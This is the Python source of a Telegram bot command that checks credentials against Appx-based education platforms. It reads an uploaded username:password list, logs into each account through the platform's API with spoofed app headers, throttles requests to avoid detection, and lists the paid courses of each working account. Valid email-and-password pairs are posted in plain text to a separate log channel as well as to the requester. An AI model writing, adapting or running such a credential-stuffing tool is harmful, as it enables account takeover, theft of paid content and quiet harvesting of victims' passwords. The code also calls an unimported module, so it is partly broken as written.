import asyncio
import requests
import uuid
from Extractor import app
from pyrogram import filters
from asyncio import Lock
from config import PREMIUM_LOGS

# ================= CONFIG =================
LOG_CHANNEL_ID = PREMIUM_LOGS   # <-- change this

SEM = asyncio.Semaphore(1)   # ONLY 1 account at a time
REQUEST_DELAY = 1.2         # 1.2 sec after every account
LOG_DELAY = 1.5             # log channel safe
PROGRESS_UPDATE_EVERY = 50
# ================= GLOBAL STATE =================
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "total": 0
}

stats_lock = Lock()
results = []

# ================= HELPERS =================
def post_request(url, headers, data):
    return requests.post(url, headers=headers, data=data, timeout=15)

def get_request(url, headers):
    return requests.get(url, headers=headers, timeout=15)

def extract_api_name(api: str) -> str:
    api = api.replace("https://", "").replace("http://", "")
    return api.split(".")[0]

def progress_bar(done, total):
    if total == 0:
        return "💻 Progress : 0%"
    percent = int((done / total) * 100)
    return f"💻 Progress : {percent}%"

async def safe_edit(msg, text):
    try:
        await msg.edit_text(text)
    except:
        pass   # UI fail must NEVER stop checking

async def login_and_get_courses(n, p, api, bot, progress_msg):
    async with SEM:
        is_valid = False
        print(f"[START] Checking {n}")

        h = {
            "client-service": "Appx",
            "auth-key": "appxapi",
            "language": "en",
            "device_type": "ANDROID",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "okhttp/4.9.1",
            "source": "website"
        }

        d = {
            "email": n,
            "password": p,
            "devicetoken": "",
            "mydeviceid": uuid.uuid4().hex[:16]
        }

        loop = asyncio.get_running_loop()

        # ---------- LOGIN ----------
        try:
            r1 = await loop.run_in_executor(
                None,
                post_request,
                f"https://{api}/post/userLogin",
                h,
                d
            )
            r1 = r1.json()
            print(f"[LOGIN-RESP] {n} -> {r1.get('status')}")
        except Exception as e:
            print(f"[LOGIN-ERROR] {n} -> {e}")
            r1 = None

        data = r1.get("data") if isinstance(r1, dict) else None
        token = data.get("token") if isinstance(data, dict) else None
        user_id = data.get("userid") if isinstance(data, dict) else None

        if not token or not user_id:
            print(f"[LOGIN-INVALID] {n} token={bool(token)} userid={user_id}")
        else:
            print(f"[LOGIN-OK] {n} userid={user_id}")

            h.update({
                "Authorization": token,
                "User-ID": user_id
            })

            # ---------- COURSE FETCH WITH RETRY ----------
            for attempt in range(1, 4):
                try:
                    print(f"[COURSE-TRY-{attempt}] {n}")
                    r2 = await loop.run_in_executor(
                        None,
                        get_request,
                        f"https://{api}/get/mycourseweb?userid={user_id}",
                        h
                    )
                    r2 = r2.json()
                except Exception as e:
                    print(f"[COURSE-ERROR-{attempt}] {n} -> {e}")
                    r2 = None

                courses = r2.get("data") if isinstance(r2, dict) else None

                if isinstance(courses, list) and courses:
                    print(f"[COURSE-OK] {n} batches={len(courses)}")
                    batches = [
                        i.get("course_name")
                        for i in courses
                        if isinstance(i, dict) and i.get("course_name")
                    ]

                    is_valid = True

                    success_text = (
                        f"👤 Account: `{n}*{p}`\n\n"
                        f"📚 Total Batches: {len(batches)}\n\n"
                    )
                    for b in batches:
                        success_text += f"🪪 {b}\n"

                    await asyncio.sleep(LOG_DELAY)
                    await bot.send_message(LOG_CHANNEL_ID, success_text)
                    results.append(success_text)
                    break
                else:
                    print(f"[COURSE-EMPTY-{attempt}] {n} -> {courses}")
                    await asyncio.sleep(1.5)

        # ---------- STATS ----------
        async with stats_lock:
            stats["checked"] += 1
            if is_valid:
                stats["valid"] += 1
            else:
                stats["invalid"] += 1

            checked = stats["checked"]
            valid = stats["valid"]
            invalid = stats["invalid"]
            total = stats["total"]

        remaining = total - checked

        if checked % PROGRESS_UPDATE_EVERY == 0 or checked == total:
            asyncio.create_task(
                safe_edit(
                    progress_msg,
                    f"{progress_bar(checked, total)}\n\n"
                    f"⚙️ Checked : {checked}\n"
                    f"📊 Valid   : {valid}\n"
                    f"❌ Invalid : {invalid}\n"
                    f"💾 Left    : {remaining}"
                )
            )

        print(f"[END] {n} valid={is_valid}")
        await asyncio.sleep(REQUEST_DELAY + random.uniform(0.3, 0.7))                           
# ================= COMMAND =================
@app.on_message(filters.command("babe"))
async def pw_command_handler(bot, m):
    cfile = await bot.ask(
        m.chat.id,
        "📄 Upload credential file (`username:password` per line)"
    )

    file_path = await bot.download_media(cfile.document.file_id)

    appx = await bot.ask(
        m.chat.id,
        "🌐 Enter Appx API domain (without https://)"
    )
    api = appx.text.strip()

    with open(file_path, "r") as f:
        lines = [i.strip() for i in f if ":" in i]

    stats["total"] = len(lines)
    stats["checked"] = stats["valid"] = stats["invalid"] = 0
    results.clear()

    progress_msg = await m.reply_text(
        f"{progress_bar(0, stats['total'])}\n\n"
        f"⚙️ Checked : 0\n"
        f"📊 Valid   : 0\n"
        f"❌ Invalid : 0\n"
        f"💾 Left    : {stats['total']}"
    )

    tasks = []
    for line in lines:
        n, p = line.split(":", 1)
        tasks.append(login_and_get_courses(n, p, api, bot, progress_msg))

    await asyncio.gather(*tasks)

    # ================= FINAL TXT =================
    api_name = extract_api_name(api)
    txt_path = f"valid_{api_name}.txt"

    if results:
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n\n".join(results))

        await m.reply_document(txt_path, caption="📄 Final Valid Results")
        await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")
    else:
        await m.reply_text(
            "❌ No valid accounts found.\nAll credentials were checked safely."
        )
